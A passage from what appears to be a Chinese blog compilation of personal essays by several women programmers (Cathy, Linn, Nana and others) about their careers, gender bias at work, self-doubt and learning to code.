<p>ASP，我不会。当初老大问的时候，我说应该还好，没有什么问题的。当初说好交接时间是一个月的，那人不同意，最后说是一个星期完成交接。结果是她最后上班的一个星期，她只来了两天。My God！那段时间是我最难熬的时候，User的电话打个不停，而我都不知道怎么解决，而且也找不到人帮忙。真是叫天天不灵，叫地地不应的。全靠自己一点一点的摸索。最终工作终于是游刃有余了。但是ASP我只是皮毛。</p>
<p>我最初进公司的目的是想学C#，直到09年7月份的时候才接触到了C#。公司的系统要进行改版，用C#来编写。之前的老大因为一些原因，离开了。当时我差点流眼泪了，如果当初不是他，我还不知道自己会怎么样，会不会一生就那样了，就是痛苦的一生了。</p>
<p>新来的经理，对于我产生了很大的影响。他给我们培训C#的相关知识，其实韩磊翻译的那本经典的C#书籍我都不知道翻了多少篇了，但是因为没有操作，了解到的很少。当经理给我们培训的时候，有一种豁然开朗的感觉，听起来特别带劲。经理给我们讲了程式命名的规范，SP命名的规范，自此我一直按照这些规范来规范着自己。接着就写了关于人事系统的几个窗体。看书和写代码完全是两回事。</p>
<p>新系统改版，我没有参与多少。能力不够的，在新系统上线（2010年10月份）的时候，了解了一些业务知识。当时心里很苦闷，我想做开发的，不想做维护的。维护做得没有意思，也学不到多少东西。而且要想学东西学得快的话，做开发是学得最快的。实际参与其中，才会去思考相应的解决方法。在寻找解决方法的过程中，就学到了东西。</p>
<p>现有的工作岗位满足不了我的需求，但是此刻我又不能去找工作，因为我不自信。还是觉得自己什么都不会，其实也就是什么也不会。阅读是排遣痛苦最好的方法，我陆续的阅读了一些书籍。关于心理学方面的，在我认为，最重要的源头就是心理。找到了源头就好解决问题了。</p>
<p>就这样，让我接触到了周金根的敏捷个人(有关敏捷个人的话题，需用另一篇日志来讲述)。2011年节后返回上海，当时上班没事看，我就看《遇见未知的自己》，因为我正面临着一个问题，不知道是怎么回事，就想从书里面寻找答案。谁知，看完不懂后，又跑出看了《秘密》。而敏捷练习也在进行着，在做个人生活方向盘的时候，我明白了什么对于我来说是最重要的。</p>
<p>当下也就有了计划，准备换工作了。当对某事有着强烈的愿望时，那事一定会实现的。</p>
<p>4月中旬，经理离职了，去武汉开公司。我就跟着经理回武汉了。这真是一个很好的机会，在武汉，我周末就可以回家。更重要的是，我做开发，做我喜欢做的事情。此时我已经找不到待在上海的意义了。家人和个人的前途对于我来说，是最重要的。</p>
<p>经理建议我们至少读三本英文原文书籍，这样之后就看英文就不会排斥了。为什么看书呢？你解决某个问题的时候，在网上找到的资料时很片面的。书里面的知识比较全面，但是需要花时间。还推荐了一些关注的英文网站。Code Project 是必备的。提高搜商是必须的，找准问题的关键点。坚持每天看书。关键是要多思考。充分的运用各种知识的能力。</p>
<p>我意识到某个地方不足的时候，会找相应的书籍来充电。让我一段时间不看书，会浑身不舒服的。当然我看的书的范围很广泛的。</p>
<p>从事这个行业，本来就不是那么轻松的事情。而我不喜欢轻松的工作。这个行业不断的出现新的知识，需要不停的学习。其实不管哪个行业，都需要不停的学习，否则很快被淘汰的。</p>
<p>爸妈曾经说过，如果我当初去读研，毕业后去学校教书就好了，工作稳定。未来的事情谁说得到呢。我不喜欢当老师，而且在这个变化莫测的社会，又有什么是稳定的呢？同学、朋友跟我讲，女孩子干这行太辛苦了，转行吧。可是我能够体会到乐趣所在。为自己写出了一段好的代码，或者是解决了某个困难的问题。</p>
<p>这个行业要加班，熬夜，那么为什么不能从别的角度来看这个问题呢？提高自己的工作效率，管理好自己，是不是可以解决这个问题呢。</p>
<p>这一年，我一直在修生养性，读灵修方面的书籍。人管理好自己后，其他的是不是就不是问题！</p>
<p>从事这个行业，我无怨无悔。现在我还是菜鸟，需要学习的东西很多。未来的路还很长，我坚信我会走好的。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Cathy_-_%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%85%B8%E5%9E%8B%E7%9A%84%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%9B%B2%E6%8A%98%E7%BB%8F%E5%8E%86"></span>Cathy – 一个非典型的女程序员的曲折经历<span class="ez-toc-section-end"></span>
</h5>
<p>简单介绍一下我自己吧，我07年从一所TOP10的著名理工大学计算机专业硕士毕业，目前在一间世界500强的欧美通信公司担任高级系统软件工程师的职位。</p>
<p>因为本科并不是学的传统计算机专业，而是计算机与通信的交叉学科（课程设置上少了面向对象、JAVA程序设计等计算机高级专业课程，增加了很多电子线路设计、通信、信号论等）。毕业时因为专业课成绩优异直接保研。如果说本科毕业的时候，自己还是颇为踌躇满志，那研究生的三年就是郁闷的开始。保研后，虽然还在计算机专业但主要从事的是硬件电路板的开发。项目组的组长是一个博士，人很好但是不太会和女孩子打交道，或者说有一些性别歧视吧。进入项目组之后，一开始做了一些电路板的Schematics、PCB layout和Debug的工作，也得到了组长的好评。但是渐渐的，由于我并没有表现得非常的积极主动和对技术充满热情，组长分给我的任务越来越少。我也越来越苦闷，当时的我还并不知道该如何面对这种情况。组里曾经也来过一个女生，面临比我还要糟糕的情况，记得一次项目组吃饭当时那个女生没来，组长直接对我们大家说这个女生能力不行，没过多久她就被调去别的组了。但是我还留在这里，组长几乎很少和我说话，当时的我不知道如何向他表达我的心情也不知道自己想要什么，陷入对自己能力的深深的否定中，当时的想法只有一个：赶快毕业吧。这种情况一直持续到研二下学期。最后一年碰到了一个去国外实习半年的机会，毫不犹豫的就去了，是在一个很牛的电子公司里做电子工程师助理。干的活基本和在项目组干的差不多，画图调板子打杂，但是这半年我想清楚了一件事，就是我对干硬件没啥兴趣如果不能做IC design的话就转去做软件吧！</p>
<p>但是，当时的我还陷入在对自己能力的盲目乐观中，总觉得自己之前成绩很好，做实验写程序从来不输给男生，想转应该不难吧。回国后迅速搞定论文就开始找工作了。找工作的时候，现实很快无情地把我打倒了。因为当时我的男朋友也是现在的老公已经早我几年毕业在北京工作了，而且发展得很不错，所以当时我也一心只想找北京的工作。可是自己过去三年几乎没有写过程序，和学校里众多写过N年程序的同学竞争，结果可想而知。我只能拿到去其他城市做硬件的offer，但是却无法拿到去北京做软件的offer。这时，我的自信心跌到了谷底，TOP10大学的TOP10学生（即使读研期间很郁闷但是还是拿了不少奖学金，而且去国外半年也赚了不少钱）居然找不到工作。后来，在一个师兄的推荐下，得到了我的第一份工作，在北京的一个小公司做嵌入式软件开发。</p>
<p>虽然能来北京做软件，但和我去Google、Microsoft、IBM的同学相比，失落感不言而喻。几乎每个认识的人都会问我为什么去那个公司，为什么不去大外企，为什么不留在国外。这种失落情绪笼罩了我工作的第一年。但是还好，这个公司没什么牛人，并且因为我很好的学习能力，很快上手了。因为做底层软件需要对各种硬件接口、中断、DMA、处理器深入理解，我之前做硬件的经验也派上了用场，只用了半年时间，我就开始独立负责项目了。从第二年开始，我开始参与公司一些重要产品的开发，越来越得心应手。</p>
<p>期间，公司从其他部门调了一个工作多年的男程序员来做我的领导。一开始，我很高兴，因为了解到这个人技术不错，而且一直做上层软件所以对面向对象、设计模式、软件架构、代码规范都颇有经验，我正好可以向他学习。但是，一起工作了一段时间后，矛盾出现了。这个人认为我虽然学东西很快对公司产品业务熟悉，但是对技术缺乏热情很少主动学习技术，对很多软件开发的基础也掌握得不够，所以每次对我的评估结果就是一般；而我当时初出茅庐，认为这个人对硬件毫无了解并且没有很快在做底层软件上证明自己比我牛，所以很不服气。记得当时一起开发一个产品，因为我对主要的业务逻辑更熟悉，所以挑了最复杂的业务逻辑模块来做；他则负责其他几个通用模块的开发。为了证明自己，我只用了他一半的时间就完成了所有功能。在联调测试过程中，由于他是项目的负责人，所以每次Bug都是先提交到他那里然后再由他来指派给对应的人来负责。因为他对平台不熟悉，所以每次解Bug都要连调试器跟很久，而我常常只通过代码Review就能找出问题所在。渐渐的，所有测试的问题都直接反馈到我这边；后来产品上市，售后碰到解决不了的问题也会直接反馈到我这里。等到我们一起开发第二个产品的时候，那个男程序员几乎完全交由我独立负责。半年后，他调回了他之前的部门，我们共同开发的两个产品也顺理成章由我独立负责下去。</p>
<p>在公司工作三年以后，我对继续呆在这个部门里干软件开发渐渐失去了兴趣，基本都是重复性的劳动，而且由于是小公司除了开发之外还有很多杂事（比如因为公司售前售后没有技术背景，常常需要开发去Support；因为薪资不高常常会招一些水平较低的工程师，需要很多力气去Training）软件水平也难以再提高。而这时，公司也有意让我转向业务型负责人的方向，这几乎是在当时公司晋升的唯一途径；而如果升职，之后基本和程序员Say Bye了。可是真的要放弃做开发吗？以当时所在行业规模和公司本身的名气地位来说，如果不做开发，我很难想象以后跳槽的机会在哪儿；如果做开发，我又很难在公司继续获得我想要的。于是，我接受了公司的安排，去体验一下程序员之外的工作是否适合，同时也积极寻求跳槽的机会。在公司的最后半年，我几乎脱离了开发的工作，主要的工作内容是调研公司计划新开辟的产品线的产品形态及技术，去往各地出差做客户交流，和开发部门开会制定产品开发计划。在这半年里，我开始怀念单纯的程序员生活，不用去应酬形形色色的陌生人，即使公司倒闭也能很快找到工作养家糊口的踏实感。</p>
<p>第二次找工作的经历和第一次完全不同，有了之前几年的工作经验，我很快就拿到了几个大公司的offer。通过面试，我也逐渐认清了自己的不足之处。回想起来，我觉得之前那个男程序员说的一点没错。我并不是个本身对技术非常有热情的人，之前的研究生经历也是如此，后来工作也常常认为自己学东西快所以技术可以等到用的时候再学。面试的时候和一些经验丰富的面试官交流，可以非常明显得感受到热情这个东西对技术水平有着多么重要的影响。但是，另一方面，我对技术也并不是完全没有热情，这种热情很大程度受外界环境的影响。如果在一个大家都很牛都很积极学技术的环境，我也非常乐在其中。选择目前的公司，一是因为当时经历了比较艰苦的几轮技术面试，另一个重要的因素就是这里是有可以正面影响我的环境。目前在现在的公司工作了大半年，虽然部门三十多个程序员就我一个女孩（但是很多男程序员级别都比我低，哈哈）但是很开心，周围都是聪明并且富有经验的同事，让我受益很多，对技术也越来越有兴趣。</p>
<p>这就是我有点曲折的女程序员经历，但也是女程序员们很有可能会碰到的情况，譬如性别歧视，譬如对技术的热情等等。我觉得做女程序员不容易，女程序员由于女性的心理特质容易把负面的情绪扩大。所以女程序员最重要的是内心强大，碰到不信任你的领导或男同事，要大胆说出自己的想法，同时拿出有说服力的行动。另外，从我自己的经历和我面试过的女程序员来看，女孩通常会专注于完成工作，不像男孩那么对技术有热情；而且社会上也有各种声音说女孩不适合做程序员，于是女孩也容易自我怀疑。我的经验是，有时候先暂时不要想究竟适不适合，努力做一段时间，有些事情需要深入到一定程度才会有兴趣，如果还是不喜欢再考虑是不是放弃。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Linn_-_%E8%AF%AF%E6%89%93%E8%AF%AF%E6%92%9E%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98"></span>Linn – 误打误撞的程序员<span class="ez-toc-section-end"></span>
</h5>
<p>昨天老公发来的网址给我看。<br>
那时候刚好项目上线，大家要去聚餐，就匆忙的瞅了一眼，跟老公开玩笑说，怎么样，我也写一篇？<br>
他说好啊。</p>
<p>今天是2011年的最后一天。<br>
挺有纪念意义的，回顾一下。</p>
<p>我是高中生，05年毕业，去了北大青鸟，我知道现在很多人对北大青鸟的看法褒贬不一。<br>
怎么说呢，一母生九子吧。</p>
<p>其实当初高考失败，我不想去上大专，更不想复习，我知道自己学不进去。<br>
那时候接触电脑不多，可能也就一周一次的电脑上机课，但我就是对它很有兴趣。很单纯的。</p>
<p>接着，同学听别人说了北大青鸟，然后想让我跟她一起去。<br>
其实，当时我连编程是干什么的都不知道。哈哈。<br>
我那个同学也是女的。<br>
我说服不了我爸爸，我爸爸还是比较想让我上大专，他说至少你出去长长见识。<br>
我脾气比较倔，想一件事，就一定要去做，我带我同学去我家，她的劝说能力比较强，最后我爸无奈之下同意了。</p>
<p>然后我就离开了我们县，去了我们省的省会。</p>
<p>第一次出远门。<br>
我当时不会讲普通话，我觉得自卑（现在想想我真是很容易自卑），到了那里后，同学跟她姐姐有事出去了几天。<br>
那几天我就跟个傻子一样，就在她姐姐租来的小屋子里呆着，没有电视，没有电脑，甚至我不怎么出去吃饭。<br>
寂寞、孤独、无助、茫然。<br>
其实人的恐惧源于无知。对这个城市的无知，对未来生活的无知。</p>
<p>我终于没有忍住，给家里打了个电话，哭了。<br>
我爸跟同学的爸爸听说后，立马就坐车到了我住的地方，我那时候真的没有想到有那么严重的结果。<br>
我爸爸一直都比较宠我，我没想到他们会来。<br>
那天我刚好跟同学还有她姐姐出去玩，很晚才回来。<br>
那是夏天，很热，就看到两个老人满头大汗的在我们住的屋子对门那家，吃西瓜。<br>
我差点又哭了。<br>
第二天早上，我爸问我，他说，你还想留下吗。<br>
我说想。<br>
就这么回去了，我觉得没脸。</p>
<p>我想那时候我爸就彻底死了劝我回去的心了吧。</p>
<p>然后交钱上课。</p>
<p>大家刚学编程的时候可能都会有那样的经历，计算机本来就是一个很抽象的东西，编程，就是抽象中的抽象。<br>
刚上课的时候，很久没有玩过电脑，我甚至忘记了本来就不怎么熟悉的盲打。<br>
我很清楚的记得班主任跟我说：盲打还不会，基础不行啊，多练习练习。</p>
<p>2005年8月份，到2007年3月份，我毕业了。</p>
<p>这时候我的状态：学过多门编程语言，主打java，当初学了app4.0，4.0的课程里有struts1.2，oracle等。<br>
但，知其然不知其所以然，还是懵懵懂懂的样子。</p>
<p>其实我们当时有两个就业方向.NET，J2EE，当时还是叫J2EE的。<br>
都说J2EE是比较难的，我为什么学这个，说起来也有点搞笑，因为我觉得，.NET可视化功能太强大了。<br>
我本来就学的懵懂，不精，控件拖来拖去的，我就更迷糊了。不如JAVA一行行代码写起来来的踏实，哈哈。</p>
<p>第一次面试，现在说起来真的很鄙视当时的自己。<br>
我本来是相当老实一孩子。<br>
我们当时有就业部，负责学生就业。<br>
教我们如何面试，如果跟面试官交流，如何突出自己的优点。<br>
我记得特清楚的是，如果人家问你的缺点，你可不能真说你自己的缺点，要说一种看起来像缺点，实际对编程或者公司来说是优点的。<br>
我真是傻孩子，我这么干了，记不太清我的原话了，但大意说自己比较执着什么的。<br>
面试官最后说了一句话让我无地自容至今，他说：这不还是你优点吗？</p>
<p>07年4月9号入职。公司做一个门户网站。</p>
<p>公司给新员工机会，试用三天。<br>
就是看公司原有的框架spring+ibatis，做一个功能给pm看，如果可以，就留下。<br>
我运气有点背，机器有问题，不时的挂。<br>
再说我也没怎么看懂的说，三天过去以后，没能拿出来一个东西。<br>
pm过来看了一下，然后跟人事说，回来的时候表达要我离开的意思。<br>
当时我内向啊，有点懵。<br>
我跟他说，我机器有问题。<br>
pm人也很好，他说那再给你半天吧。<br>
这时，我后来的组长，真的给我很大的帮助，他说你应该怎么怎么来。<br>
其实我本来有些懂的，他那么一说，我顿悟了。<br>
1个小时，或许不到，反正很短，我又叫pm过来看。<br>
他跟我说，好了，你可以留下了。<br>
我跑到卫生间，那瞬间，真的很想大哭。兴奋、激动、委屈。我也读不懂当时的那种感情。</p>
<p>其实这个公司并没有让我的技术提高多少。<br>
pm是一个技术相当强悍的人，至今见过这么多人，我依旧这么觉得。<br>
框架里的很多东西，当时不太能理解的了。<br>
但是当初经历的那群人，真的让我铭记至今。</p>
<p>09年，男朋友毕业，留在了另外一个城市，我所在的公司宣布解散，于是我也过去了。</p>
<p>其实我觉得我内心深处有一股非常强烈的自卑，我不知道这自卑来自于过度的谦虚，还是觉得自己的水平真的不行。我想或许两者兼有。</p>
<p>在这个城市的面试很糟糕，我是一个很简单的人，只是想尽自己的努力去做一些事情。<br>
后来留在了一家公司，公司新开的一个部门。<br>
招的都是几个大学刚毕业的学生，有几个从达内出来的。<br>
他们的技术不是不怎么样，是真的很不行！<br>
于是我跟另外一个男同事就成了头儿。</p>
<p>那时候的项目是给公司自己用，做页面，写css，写代码，服务器，几乎都是我来牵头。<br>
那一年的时间，对我的感触很大，技术也提高很多，因为什么事情都是你自己来做，自己去想。<br>
压力很大，但也很茫然。我不知道自己在做些什么。因为公司毕竟不是正规的it公司，我自认自己技术挺烂，真的需要人协助。</p>
<p>说一下我的男朋友。<br>
他一直喜欢手机上的东西，知识面覆盖非常广。<br>
10年6月份的时候，北京有一个机会，他过来面试，然后留下做iphone手机开发了。<br>
于是我也着手辞职跟着过来。</p>
<p>北京的面试依旧不怎么乐观。于是我几乎每天晚上看基础知识看到很晚。<br>
我一个同事说的好。他说如果你不能说，你就只能靠做面试题来让对方看到你的水平。</p>
<p>我还是算运气比较好，一个星期的时间，我收到了现在公司的offer。</p>
<p>或许你看到这里已经明白，我几乎是跟着男朋友的脚步走。<br>
事实上，是这样的。<br>
做程序员，只是我要做的一件事。而家庭是我的全部。<br>
事业上，我其实一直都很茫然。<br>
我想是有这样一部分的人存在，他们没有梦想，没有目标。<br>
我说的梦想是指那种真心喜欢，并能为之奋斗一生的事情。<br>
我想我就是那样的人。<br>
但这种人必然有另外一种追逐的东西，比如，我时刻都很清楚家庭才是我的全部。<br>
我会找一份不很累的工作，有充裕的时间，来陪伴他们，同时也让自己有事情做，不空虚，不无聊，不虚度。<br>
但这不代表我工作会做的很糟糕，相反，我第一个项目经理跟我说，以后如果我开了公司，我第一个就会找你。<br>
我第二家公司的老板，在我来北京之后还打电话叫我回去。<br>
现在的公司，领导跟我说，我见过很多跟你一样条件，从北大青鸟出来的人，但像你这样的，真的少见。</p>
<p>我做程序员，其实算误打误撞，现在想想，我当时向往的应该是美工设计之类的工作。<br>
我不是什么技术大牛，我碰到的女程序员，也没有什么技术大牛的。<br>
但是他们都有一个共同点，就是不管他们做任何东西，只要交到他们手上，在相等条件下都会比男同事做的好。<br>
这可能跟女孩子天生的认真细心有关。</p>
<p>这篇文章，可能看起来比较乱。<br>
但我想表达的一个意思就是，其实女程序员很普通，也特别，神秘，也不神秘，如果你了解了的话。<br>
但她们绝对是可爱的。大多数有着男孩子的性格，豪爽。<br>
所以我时常说这世界上有男人、女人、女博士、女程序员，哈哈。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Nana_-_%E5%81%9A%E5%96%9C%E6%AC%A2%E5%81%9A%E7%9A%84%E4%BA%8B%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BE%88%E5%BC%80%E5%BF%83"></span>Nana – 做喜欢做的事，所以很开心<span class="ez-toc-section-end"></span>
</h5>
<p>你好，关于女程序员的那篇blog是群里一个GG推荐我看的。这应该算一个励志故事吧，可是一般励志故事都没什么意思，不是苦大深仇，就是从委屈一路走到故事末尾，见到一点小小的胜利。说的故事虽然到了末尾，但人还活着啊，所以真正的故事还没完呢。对励志剧不太感兴趣，因为事实往往是，努力不一定会成功，而且不成功的在大多数。</p>
<p>我的故事无关成功与失败，随便看看。先说说为什么会去写程序这件事吧。起初完全不相关的，我喜欢的是动漫。但是对于自己的画画和分镜都不看好，于是想到了游戏。动漫游，是不分家的。游戏行业有许多种职业，常见的小工有：策划美术程序。这3种职业的相关基础课都上了下，其中，编程给我留下了非同寻常的印象：这件事情，太TM好玩了！！即便会拉3D模型、会设计游戏的灵魂世界观，也不能同它相比。于是，几乎没怎么犹豫就开始学习编程了。</p>
<p>一开始是学java，比较容易的。后来接触了C++，貌似稍微复杂点，不过总的来说，会了一门语言其它的都有点异曲同工，所以不管性别如何，其实没啥差别。在工作中，也没觉得人家拿我性别说事或特殊化，大家都凭能力干活拿薪水，可能比某些靠关系的行业好一点。很想推荐下我们项目组正在开发的这个游戏，但又怕一说名字就暴露了，呵呵，我们组就我一个mm。</p>
<p>人家都说，编程薪水高，我不能说这是假的，但我的同学中，薪水高的都是加班连轴转、除了程序不太想其它的。用那样的精力时间换来的高薪，到哪个行业都能换到吧。</p>
<p>学历，貌似在编程这个行业里更加渺小了吧。只有一次去面试一家大游戏公司时，被问过是不是重点大学。其它公司基本不怎么关心，更看重能力。也只有一次，在面试中，被问到是否已婚。可能是怕生孩子耽误工作吧，人走了活儿给其他人干，其他人虽然不说什么，但无形中增加的压力是肯定有的。但在这里我要说一句，这些面试官思维都有点传统啊，其实不结婚也可以生孩子、已婚生完孩子的也可以再生啊。要不你们干脆就说，女性勿面试，不是更好？！</p>
<p>做程序是吃青春饭，这话有点道理的。我现在的工作，是喜欢干的事，所以很开心。但如果是一个需要养家糊口的GG，可能就不能只顾着自己开心了。所以说，做程序员，mm也许更合适？</p>
<p>呵呵，午休结束了，回去干活～</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Gift_-_%E5%BD%93%E4%B8%80%E5%90%8D%E6%88%98%E5%A3%AB%E5%B0%B1%E6%98%AF%E4%B8%80%E6%94%AF%E5%86%9B%E9%98%9F%EF%BC%8C%E9%82%A3%E4%BA%9B%E8%BD%AF%E4%BB%B6%E4%B8%8D%E9%9C%80%E8%A6%81%E5%B7%A5%E7%A8%8B%E7%9A%84%E6%97%B6%E5%80%99"></span>Gift – 当一名战士就是一支军队，那些软件不需要工程的时候<span class="ez-toc-section-end"></span>
</h5>
<p>请允许我为公正评价女程序员做一点贡献。以下文字所提到的关同学是一位女程序员。</p>
<p>注：以下文字已发表于[http://blog.csdn.net/younggift/article/details/7166600]。</p>
<p>* 最初的代码</p>
<p>1994年，当我开始对编程感兴趣的时候，还没有软件蓝领这一说法，但是我已经有了后来软件蓝领流行起来以后的困惑。</p>
<p>我第一次做的比较大的程序，是用GW-BASIC写的，没有IDE界面，需要按行号插入，黑底绿字的显示器，单个软驱倒腾用两张盘。 (感谢我们的导员刘春光老师每天中午借我用他的计算机) 要编的程序是自己想出来做着玩的，一个DOS界面下CGA显示模式，菜单方式的……班费管理程序。如同齐同学的那个定票系统，这个软件并没有实际应用，不过，它对我来说，比此后所有写的程序都更难。</p>
<p>代码后来参加一个比赛的时候，打印了唯一的一份纸质版，打印纸抻开比我举起手还要高。我当时遇到了程序设计中的核心问题–大量的代码，复杂的逻辑。</p>
<p>我当时使用了GW-BASIC提供的一个非BASIC的功能 gosub，类似于函数调用，它帮助我逃过了程序彻底混乱的厄运。后来当我学到模块化思想的时候，如遇故人。我毫不费力地就接受了这个观念，因为痛过，所以印象深刻。</p>
<p>后来经常见到有初学的同学函数写得超出两三屏，还很得意自己逻辑控制能力。我就在心里撇嘴，你那是还没受够罪。</p>
<p>大量的代码，复杂的逻辑。软件工程给了我们某个答案，就是软件蓝领，它声称大量的人工、短期培训、重复地简单劳动，能够解决–以工程的方法–大量代码和复杂逻辑的问题。</p>
<p>是的，我们这么干过，好几千看前就这样做。埃及盖金字塔，是没有起重机的，而是靠几千几万人力完成的；中国的古长城 (不是当代的) ，也没有等待现代电子计算机和通信技术的发展，而是靠万喜良们的双手堆砌出来的。</p>
<p>那个时候，他们一定期待一种东西，可以用燃油作为动作，稳妥精确地运输沉重的材料。</p>
<p>但是他们没有。因为是时代是父亲是民族选择我们，而不是反过来，所以很多时候很多事情都不能一蹴而就。</p>
<p>有的时候，智力或自然的法则也参与限制。</p>
<p>* 他们说，没有解析解</p>
<p>在数学当中，有一种解题的方法得出的结论称为解析解。我们解一个方程，得到结果，如果我们所做的常见运算只需要 有限次，那么，这个结果就称为解析解。</p>
<p>这是什么意思呢？就是说，你可以通过公式，只需要一个大式子，可能非常大，但是最终可以计算出结果，直接地。</p>
<p>难道不都是这样么？不幸的是，还有一些方程，伟大的牛人数学家们告诉我们，有些方程就是不能通过公式求出来。而我们在工业生活中还需要求解。</p>
<p>数学家牛人们还是有办法的。他们创造了另一种方法，用猜测-比较-再猜测，大致这样的方法，逼近我们寻找的那个数。这些牛人们中的第一位就是著名的牛顿。</p>
<p>但是，我们得到的是那个”数”，是整个方程中的一段，而且是粗糙的。精细的完全一致的解，可能永远也无法求得，我们得到的就是对于当前的应用”足够”精确<br>
的个案。</p>
<p>人类是多么地热爱形而上，热爱一次性解决所有问题啊。可是，数学牛人们说，有时候，你哭也没有用，就是不行。</p>
<p>在程序设计中也是一样，只有工程方法，有人说，就是蓝领方法，才能解决大量代码和逻辑复杂的问题。</p>
<p>如果没有燃油，没有热功当量，除了征服更多的奴隶，又有什么方法能够赢得自己的自由呢？</p>
<p>但是，我们是否已经判定程序设计一定没有解析解，所以只能靠人力逼近？</p>
<p>* 解析解</p>
<p>我和李记者曾经对刘典同学怀有偏见，认为他(没有虽然技)技术极好 ，但是却从不注重软件中的工程，也不怎么注重合作。</p>
<p>今天，关同学用事实给了我强烈的教育。她用事实告诉我：软件工程为什么有时可以忽略？因为有的程序员，她一个人可以完成超过100个程序员的。</p>
<p>就像有的战士，一个人就是一支军队。</p>
<p>刘典同学讲过他写数据库的程序用了编译原理生成代码，讲过写手机游戏的时候用虚拟机。前几天，我刚刚写了3千多的代码生成器，吐出来近6万行代码。这些<br>
给我的印象也都没有今天这样深刻。</p>
<p>程序设计，是一种创造工作，就像写小说。与写小说不同的，你所创造的是一台机器，它可以做很多事，你甚至可以制造一台机器，它以代替你写作最终需要的<br>
代码。</p>
<p>在所有的计算机本科都开设了相关的课程，叫做编译原理。在一定程度上，这是一个解析解。</p>
<p>* 关同学</p>
<p>今天我CIAC的导师请大家吃饭，辛苦一年。导师本人想参加，我托包师弟说：不欢迎他。如果导师出现，今天稍微拘谨的场面，就可能令聚会完全不同。</p>
<p>我们讨论了，我们吃午饭了，我们唱歌了，我们又吃晚饭了。</p>
<p>刚开始吃晚饭没多久，包师弟说：2012的上半年，我们有一些任务要完成，相当于本年度完成任务的40倍工作量。</p>
<p>他说：这些工作都是相似的。</p>
<p>可是这些相似的工作如果不能抽象出其中相同的部分，就没有一点相似。我们人类看到的相似，对于构造代码而言，毫无用处。</p>
<p>我看不出来相似。然后我想了几个方案，又都推翻–我在想从哪里抓那么多奴隶来，又用什么报偿他们，工程本身于他们何益。其实，同学们并非奴隶，必须保<br>
证同学们有足够利益和受益，否则除了我自己，一个人也派不出来。</p>
<p>我说：包师弟啊，你能不能别在吃饭的时候说这个，我都吃不下去了。</p>
<p>我真的吃不下去了。焦虑。而且，从这以后，我真的几乎没吃啥。</p>
<p>奇迹时刻。</p>
<p>关同学说：老师其实我想了，这些方案都是类似的。</p>
<p>我说：啊？</p>
<p>她说：所有的界面都可以……根据配置文件，new 出 一个 label来……</p>
<p>是的，不熟悉关同学的，对女生能否写好程序有疑问的，请仔细看一下，她，不是他。</p>
<p>而且，她也不必再解释这个方案，因为软件组可以全体解散，而剩下的工作，只需她一个人短时间就可以完成。</p>
<p>这就是抽象的力量。</p>
<p>她没有写GUI，而是解析配置文件生成了GUI；她绕过了令我头疼的C#如何表示GUI–这样就可以生成RC文件，在编译前，我考虑过的方案–而是在运行时，new<br>
出所有的GUI控件来，相当于解释执行的。</p>
<p>* 后来</p>
<p>后来，全体软件组成员加入了硬件组，将承担下位机的代码。很好，我终于不用再讨厌他们用的IDE了，因为再也没有他们熟悉的VS什么的了。我们都开始进入<br>
单片机或ARM的世界。</p>
<p>后来，关同学对我的赞不绝口指出：这个方案是你告诉我的啊。</p>
<p>我说：啊？</p>
<p>她说：就是大仪网的时候，你告诉我blabla。</p>
<p>我想起来了。不过，这仍不是我的方案，而是她的。一个方案之所以好(像这个，好到如此突出，以致你一眼就能看到，绝不可能错过，如果你看到了的话)，是因为它被应用在一个恰好合适的领域，恰好解决了一个难题。至于这个方案有多难有多容易，有多高科技，其实不是多重要。</p>
<p>关同学刚毕业的时候，我们在CIAC讨论一个框架，当时我说：这个倒是可以再抽象，不过我的方案有点耍赖了。</p>
<p>关同学说：你是不是要用函数指针。</p>
<p>是的。而且我非常欣慰了一下，因为学生优秀。</p>
<p>黄同学当时认为：函数指针，也没啥难的啊。</p>
<p>是的。函数指针一点也不难，能想到用函数指针解决这个问题，是一个高度。</p>
<p>关同学在此刻想到了一个如此好的方案，所以接下来的半年，我们都不必那么焦虑了。</p>
<p>这就是解析解。</p>
<p>关的方案，不是减轻了劳动，不是像我以工程的方法、各种测试 (关今天还提出用MATLAB生成测试数据，也很好，后来给齐同学用上了) 来控制代码质量，用框架规范程序员的行为，这些都不是，关同学直接替代十来个人把40个用例生成了出来。</p>
<p>代码质量如此一致和优秀，是由图灵保证的。</p>
<p>* 后后记</p>
<p>上午，与一位技术人员和一位经理谈话。</p>
<p>我提到 通用的CMS &gt; 定制的站点 &gt; 使用CMS。</p>
<p>那位技术人员不认可。我说：我刚刚说错了啊，我不是指复杂，而是指困难。</p>
<p>那位技术人员blabla说，这不困难，只要如何如何即可。</p>
<p>我说：其实我们也不必达成一致意见。我的意思不是说我们无法实现，我说的我会收更多的钱。</p>
<p>争执略去，我同意那位技术人员的下面这个观点 (大致意思，我翻译过的) ，但是当时没有时间表达：这不是工作量，而是更高的高度。</p>
<p>是的，那不是更复杂，不是更消耗时间，甚至不是更困难。</p>
